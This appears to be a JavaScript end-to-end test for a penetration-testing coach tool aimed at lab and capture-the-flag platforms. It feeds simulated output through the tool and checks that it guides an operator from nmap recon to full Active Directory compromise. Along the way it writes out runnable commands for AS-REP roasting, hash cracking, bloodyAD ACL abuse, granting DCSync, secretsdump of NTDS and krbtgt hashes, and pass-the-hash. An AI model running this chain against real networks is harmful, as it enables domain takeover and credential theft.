/* End-to-end AD kill chain: drive REALISTIC tool output through the real parse→coach pipeline and prove
 * the coach advances from bare recon all the way to domain compromise with no dead ends. Generic data
 * (corp.local) — this validates the PIPELINE, not any one lab. If a fix ever breaks a rung (a fact stops
 * minting, or a milestone move stops being reachable), this fails loudly instead of the operator finding
 * it mid-box. */
'use strict';
var fs = require('fs'), path = require('path'), vm = require('vm');
var ROOT = path.join(__dirname, '..', '..'), ENG = path.join(ROOT, 'assets', 'engine');
var ctx = { console: { log: function () {}, warn: function () {}, error: function () {} } }; ctx.globalThis = ctx; vm.createContext(ctx);
function load(f) { vm.runInContext(fs.readFileSync(f, 'utf8'), ctx, { filename: f }); }
['facts.js', 'phases.js', 'pack.js', 'packs.js', 'command.js', 'workspace.js', 'profile.js'].forEach(function (f) { try { load(path.join(ENG, f)); } catch (e) {} });
load(path.join(ENG, 'parsers', 'common.js'));
['nmap', 'directory', 'creds', 'host', 'web', 'services', 'database', 'websource'].forEach(function (m) { load(path.join(ENG, 'parsers', m + '.js')); });
load(path.join(ENG, 'parsers', 'index.js'));
load(path.join(ROOT, 'data', 'packs-bundle.js'));
var OBOL = ctx.OBOL;

var fail = 0;
function ok(cond, msg) { if (!cond) { console.error('  FAIL:', msg); fail++; } else { console.log('  ok  :', msg); } }

var DOM = 'corp.local', TGT = '10.0.0.5', SCOPE = 'host:' + TGT;
var pack = OBOL.packs.actions();
var facts = new OBOL.facts.FactSet([OBOL.facts.makeFact({ kind: 'target.configured', scope: SCOPE, source: 'eng' })]);

// Ingest a step's output, fold in the facts, return {minted:Set, ready:Set of move ids reachable now}.
function step(command, stdout) {
  var r = OBOL.parsers.parseActionOutput({ actionId: '', command: command, stdout: stdout, source: 'sim', scope: SCOPE, domain: DOM });
  var minted = {};
  (r.facts || []).forEach(function (f) { if (facts.add(OBOL.facts.factFromJson(OBOL.facts.factToJson(f)))) minted[f.kind] = 1; });
  var ready = {};
  OBOL.pack.nextActions(facts, pack, {}).forEach(function (a) { ready[a.id] = 1; });
  return { minted: minted, ready: ready, has: function (k) { return facts.has(k); } };
}

// 1. Recon — full-port nmap of a DC.
var s = step('nmap -Pn -p- 10.0.0.5', ['Nmap scan report for 10.0.0.5', 'Host is up.', 'PORT STATE SERVICE',
  '53/tcp open domain', '88/tcp open kerberos-sec', '135/tcp open msrpc', '389/tcp open ldap', '445/tcp open microsoft-ds',
  '464/tcp open kpasswd5', '636/tcp open ldapssl', '3268/tcp open ldap', '5985/tcp open wsman', 'Nmap done'].join('\n'));
ok(s.minted['ports.open'] && s.minted['host.up'], 'recon: nmap mints the open-port surface');
ok(s.ready['ad-anon-ldap-enum'] || s.ready['ad-dc-identify'], 'recon → the coach offers AD enumeration next');

// 2. SMB host identity (null session) — domain, hostname, DC.
s = step('nxc smb 10.0.0.5', 'SMB 10.0.0.5 445 DC01 [*] Windows Server 2016 Build 14393 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)');
ok(s.has('ad.domain_known') && s.has('host.hostname') && s.has('ad.dc_candidate'), 'enum: SMB identifies the domain, hostname and DC');

// 3. Anonymous LDAP user list.
s = step("nxc ldap 10.0.0.5 -u '' -p '' --users", ['LDAP 10.0.0.5 389 DC01 [*] (domain:corp.local)',
  'LDAP 10.0.0.5 389 DC01 Guest', 'LDAP 10.0.0.5 389 DC01 svc-web', 'LDAP 10.0.0.5 389 DC01 jdoe', 'LDAP 10.0.0.5 389 DC01 admin'].join('\n'));
ok(s.has('ad.user_list'), 'enum: anonymous LDAP yields a domain user list');
ok(s.ready['asrep-roast'], 'enum → the coach offers AS-REP roasting');

// 4. AS-REP roast → a roastable hash.
s = step('impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass', '$krb5asrep$23$svc-web@CORP.LOCAL:aabbccdd$' + new Array(64).join('a'));
ok(s.has('hash.asrep'), 'creds: AS-REP roasting captures a roastable hash');
ok(s.ready['crack-asrep'], 'creds → the coach offers cracking the AS-REP hash');

// 5. Crack → a usable credential.
s = step('hashcat -m 18200 asrep.hash rockyou.txt', '$krb5asrep$23$svc-web@CORP.LOCAL:aabb$dead:Password1');
ok(s.has('credential.available'), 'creds: the crack yields a usable credential');

// 6. Validate the credential over SMB → authenticated foothold.
s = step("nxc smb 10.0.0.5 -u svc-web -p 'Password1'", 'SMB 10.0.0.5 445 DC01 [+] corp.local\\svc-web:Password1');
ok(s.has('smb.authenticated'), 'access: the credential validates over SMB');
ok(s.ready['bloodyad-acl'], 'access → the ACL-abuse move is reachable with a credential');

// 7. bloodyAD get writable → an ACL lead.
s = step("bloodyAD -d corp.local --host 10.0.0.5 -u svc-web -p 'Password1' get writable --detail",
  ['distinguishedName: CN=Exchange Windows Permissions,CN=Users,DC=corp,DC=local', 'member: WRITE', 'nTSecurityDescriptor: WRITE',
   '', 'distinguishedName: CN=DnsAdmins,CN=Users,DC=corp,DC=local', 'member: WRITE'].join('\n'));
ok(s.has('ad.acl_lead'), 'escalate: get-writable surfaces an abusable ACL lead');
ok(s.ready['bloodyad-acl'], 'escalate → the ACL-abuse move stays reachable');

// 8. Join the WriteDACL group (sweep) → a recorded membership.
s = step("for g in \"Exchange Windows Permissions\"; do bloodyAD -d corp.local --host 10.0.0.5 -u svc-web -p 'Password1' add groupMember \"$g\" svc-web; done",
  '[+] svc-web added to Exchange Windows Permissions');
ok(s.has('ad.group_joined'), 'escalate: joining the WriteDACL group is recorded');

// 9. Grant DCSync → an object-control path.
s = step("bloodyAD -d corp.local --host 10.0.0.5 -u svc-web -p 'Password1' add dcsync svc-web", '[+] svc-web is now able to replicate (DCSync)');
ok(s.has('ad.control_paths'), 'escalate: the DCSync grant is recorded as a control path');
ok(s.ready['dcsync'], 'escalate → the DCSync move is reachable');

// 10. secretsdump → NTDS + krbtgt = domain owned. (A real, non-blank Administrator hash so it becomes a
// usable pass-the-hash credential — a blank 31d6… hash is a disabled account and must NOT be surfaced.)
s = step("impacket-secretsdump 'corp.local/svc-web:Password1'@10.0.0.5", ['[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)',
  '[*] Using the DRSUAPI method to get NTDS.DIT secrets',
  'corp.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::',
  'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bd44fa5f6f6f6f6f6f6f6f6f6f6f:::', '[*] Cleaning up...'].join('\n'));
ok(s.has('loot.ntds') && s.has('hash.krbtgt'), 'LOOT: DCSync dumps NTDS + krbtgt — the domain is owned');

// 11. After the dump, the coach must LAND THE PLANE: the top ready move is "own the domain via pass-the-hash"
// (not coercion, which is a mere route to the DCSync you already have), the Administrator hash is a usable
// credential, and the coercion move has retired.
ok(s.has('credential.available'), 'LOOT: the dumped Administrator hash is surfaced as a usable credential');
var adminCred = facts.values('credential.available').filter(function (v) { return String(v.user).toLowerCase() === 'administrator' && v.nthash === '32693b11e6aa90eb43d32c72a07ceea6'; });
ok(adminCred.length === 1, 'LOOT: the Administrator credential carries the dumped NT hash (ready to pass-the-hash)');
var ready = OBOL.pack.nextActions(facts, pack, {});
ok(ready.length && ready[0].id === 'own-domain-pth', 'LOOT → the #1 next move is "Own the Domain — Pass-the-Hash as Administrator" (id=' + (ready[0] && ready[0].id) + ')');
ok(!ready.some(function (a) { return a.id === 'coerce-auth'; }), 'LOOT → the coercion move has retired (obsoleted by loot.ntds), no longer steering you sideways');
// the endgame move's win command carries the ☠ cash-in and pass-the-hash form
var endgame = pack.filter(function (a) { return a.id === 'own-domain-pth'; })[0];
ok(endgame && (endgame.commands || []).some(function (c) { return c.win && /evil-winrm/.test(c.run); }), 'the endgame move flags a win (☠ Pwn This Target) command');
ok(endgame && (endgame.commands || []).some(function (c) { return /-H \{\{nthash\}\}|:\{\{nthash\}\}/.test(c.run); }), 'the endgame commands pass the NT hash (fills from the surfaced Administrator credential)');

// The clutter test: owning the domain retires the credential-harvest + this-domain escalation routes, but
// KEEPS shell access, persistence, cross-domain and mapping moves (useful in a larger lab).
var readyIds = {}; ready.forEach(function (a) { readyIds[a.id] = 1; });
// closed routes to THIS domain's DA — retired the moment you hold every hash
['kerberoast', 'asrep-roast', 'shadow-credentials', 'adcs-esc', 'nxc-arsenal', 'bloodyad-acl', 'zerologon-check', 'password-spray', 'coerce-auth', 'wsus-abuse'].forEach(function (id) {
  ok(!readyIds[id], 'retired after domain-owned: ' + id + ' no longer clutters the coach');
});
['own-domain-pth', 'lateral-exec'].forEach(function (id) {
  ok(readyIds[id], 'kept after domain-owned (still useful): ' + id);
});
// CROSS-BOX LOOT stays available even after domain compromise — it yields material (SYSVOL/GPP creds,
// gMSA/LAPS local-admin passwords not in the domain NTDS, SCCM NAA creds, readable shares) reusable on
// OTHER boxes. These must NOT be obsoleted by owning this domain.
function byId(id) { return pack.filter(function (a) { return a.id === id; })[0]; }
['gpp-passwords', 'gmsa-read', 'laps-read', 'sccm-enum', 'smb-share-inventory'].forEach(function (id) {
  var a = byId(id);
  ok(a && !a.obsolete(facts), 'cross-box loot kept after domain-owned: ' + id + ' is not retired');
});
// …and the still-gated ones only surface when the avenue is actually open (based on what's possible):
ok(byId('gmsa-read') && !byId('gmsa-read').eligible(facts), 'gmsa-read stays hidden with no gMSA indicator (ad.gmsa) — gated on what is possible');

// Flag capture uses the EXISTING, already-profile-aware flag-hunt move (obol-local heritage) — not a
// reinvented reader. It must offer a pass-the-hash form so the Administrator hash from a DCSync can read the
// flags with no plaintext, and it must fill the platform's own flag names.
var flagHunt = pack.filter(function (a) { return a.id === 'flag-hunt-windows'; })[0];
ok(flagHunt, 'the dedicated flag-hunt move exists (not reinvented on the endgame move)');
ok(flagHunt && (flagHunt.commands || []).some(function (c) { return /-H \{\{nthash\}\}/.test(c.run); }), 'flag-hunt has a pass-the-hash variant (reads flags with the dumped Administrator hash, no password)');
ok(flagHunt && (flagHunt.commands || []).every(function (c) { return /\{\{flag_names_windows\}\}/.test(c.run); }), 'flag-hunt searches the profile-configured flag names ({{flag_names_windows}})');
// and the platform token itself resolves per profile (HTB vs OffSec) through the existing helper
var htbNames = OBOL.profile.windowsNameList(OBOL.profile.resolveFlagConfig({ platform: 'htb' }).names);
var oscpNames = OBOL.profile.windowsNameList(OBOL.profile.resolveFlagConfig({ platform: 'oscp' }).names);
ok(/root\.txt/.test(htbNames) && /proof\.txt/.test(oscpNames), 'the flag-name token resolves to the platform proof files (HTB root.txt, OffSec proof.txt)');

console.log(fail ? ('\nAD KILL CHAIN E2E: ' + fail + ' FAILURES') : '\nAD KILL CHAIN E2E: all passed — recon → domain compromise → land the plane, no dead ends');
process.exit(fail ? 1 : 0);
